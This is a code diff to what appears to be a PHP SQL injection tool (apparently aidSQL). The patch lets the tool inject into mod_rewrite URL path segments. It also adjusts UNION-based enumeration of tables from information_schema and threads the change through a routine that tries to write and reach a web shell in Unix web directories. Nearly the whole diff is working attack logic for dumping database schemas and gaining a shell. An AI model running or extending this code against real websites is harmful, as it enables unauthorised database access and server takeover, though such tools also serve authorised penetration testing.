@@ -144,11 +144,14 @@
 
 				$requestVariables	=	$this->_httpAdapter->getUrl()->getQueryAsArray();
 
+				$mod_rewrite		=	FALSE;
+
 				if(!sizeof($requestVariables)){
-					echo $this->_httpAdapter->getUrl();
+
 					$requestVariables	=	$this->_httpAdapter->getUrl()->getPathAsArray();
-					var_dump($requestVariables);
-					die();
+					$mod_rewrite		=	TRUE;
+					$this->log("Detected no URL variables in URL, assuming mod_rewritten path",0,"light_cyan");
+
 				}
 
 				foreach($requestVariables as $requestVariable=>$requestVariableValue){
@@ -156,6 +159,17 @@
 					if($this->isIgnoredRequestVariable($requestVariable,$requestVariableValue)){
 						continue;
 					}
+
+					if($mod_rewrite){
+
+						$requestVariable	=	$requestVariableValue;
+
+						if(is_numeric($requestVariable)){
+							$requestVariable	=	(int)$requestVariable;
+						}
+
+					}
+
 
 					$iterationContainer	=	array();
 
@@ -209,7 +223,7 @@
 
 										$this->_queryBuilder->setSQL($sql);
 
-										$result	=	$this->query($requestVariable,$callback);
+										$result	=	$this->query($requestVariable,$callback,$mod_rewrite);
 
 										if($result){
 
@@ -231,7 +245,8 @@
 																				"order"						=>	$order,			//variable
 																				"comment"					=>	$comment,		//constant
 																				"callback"					=>	$callback,
-																				"affectedQueryField"		=> $result[0]
+																				"affectedQueryField"		=> $result[0],
+																				"mod_rewrite"				=>	$mod_rewrite
 											);
 
 											$this->setInjectionParameters($injectionParameters);
@@ -239,6 +254,26 @@
 											$this->_payload	=	$payLoad;
 
 											return TRUE;
+
+										}else{
+
+											$url	=	$this->_httpAdapter->getUrl();
+
+											//Restore URL Variable or path, depending on what are we trying to do
+											//Inject on the mod_rewrite path, or, injecting query variables
+
+											if($mod_rewrite){
+
+												$url->restorePath($requestVariable);
+												$this->_httpAdapter->setUrl($url);
+
+											}else{
+
+												$url->addRequestVariable($requestVariable,$value); 
+												$this->_httpAdapter->setUrl($url);
+
+											}
+
 
 										}
 
@@ -248,9 +283,6 @@
 
 							}	//comment
 
-							$url	=	$this->_httpAdapter->getUrl();
-							$url->addRequestVariable($requestVariable,$value); 
-							$this->_httpAdapter->setUrl($url);
 
 						}	//field-payload
 
@@ -320,7 +352,7 @@
 				$sql		=	$this->_queryBuilder->getSQL();
 				$sql		=	$params["requestValue"].$params["payload"].$this->_queryBuilder->getSpaceCharacter().$sql.$params["comment"];
 				$this->_queryBuilder->setSQL($sql);
-				return parent::query($params["requestVariable"],__FUNCTION__);
+				return parent::query($params["requestVariable"],__FUNCTION__,$this->_injection["mod_rewrite"]);
 
 			}
 
@@ -531,7 +563,7 @@
 				$dbSchema->setDbUser($user);
 				$dbSchema->setDbVersion($version);
 	
-				$select	=	"TABLE_NAME,0x7c,TABLE_TYPE,0x7c,ENGINE,0x7c,TABLE_COLLATION,0x7c,IF(AUTO_INCREMENT,0x6e,0x79)";
+				$select	=	"TABLE_NAME,0x7c,ENGINE,0x7c,TABLE_COLLATION";
 				$from		=	"information_schema.tables";
 
 				$where	=	array("table_schema=".\String::hexEncode($database));
@@ -555,11 +587,11 @@
 
 						$test	=	explode('|',$table);
 
-						if(!isset($test[0])||!isset($test[1])||!isset($test[2])||!isset($test[3])||!isset($test[4])){
+						if(!isset($test[0])||!isset($test[1])||!isset($test[2])){
 
 							$this->log("DETECTED ERRONEOUS TABLE FETCHING WITH GROUP_CONCAT",1,"red");
 							$count	=	$this->unionQuery("COUNT(TABLE_NAME)",$from,$where);	
-							$count	=	$count[0];
+							$count	=	$count[0] - 1;
 
 							$tables	=	$this->unionQueryIterateLimit($select,$from,$where,array(),$count);
 							break;
@@ -581,10 +613,8 @@
 
 					$tmpTable					=	array();
 
-					$tmpTable["type"]			=	$table[1];
-					$tmpTable["engine"]		=	$table[2];
-					$tmpTable["collation"]	=	$table[3];
-					$tmpTable["increment"]	=	$table[4];
+					$tmpTable["engine"]		=	$table[1];
+					$tmpTable["collation"]	=	$table[2];
 
 					$columns	=	array();
 
@@ -627,6 +657,7 @@
 
 				$select							=	"COLUMN_NAME,0x7c,COLUMN_TYPE,0x7c,IF(COLUMN_KEY,COLUMN_KEY,0x6e)".
 														",0x7c,IF(EXTRA,EXTRA,0x6e)";
+
 				$from								=	"information_schema.columns";
 
 				$where							=	array(
@@ -825,6 +856,10 @@
 
 					foreach($unixDirectories as $unixDir){
 
+						if($this->_injection["mod_rewrite"]){
+							$restoreUrl->restorePath();
+						}
+
 						$this->_httpAdapter->setUrl($restoreUrl);
 	
 						$unixDir					=	'/'.trim($unixDir,'/');
@@ -853,7 +888,7 @@
 
 							$this->_queryBuilder->setSQL($sql);
 
-							$gotShell	=	parent::query($this->_injection["requestVariable"]);
+							$gotShell	=	parent::query($this->_injection["requestVariable"],$this->_injection["mod_rewrite"]);
 							$shellUrl	=	new \aidSQL\core\URL($shellWebLocation);
 							$this->_httpAdapter->setUrl($shellUrl);
 							$parser		=	parent::getParser();
@@ -871,7 +906,6 @@
 					$this->_httpAdapter->setUrl($restoreUrl);
 
 				}
-
 
 				return FALSE;
 
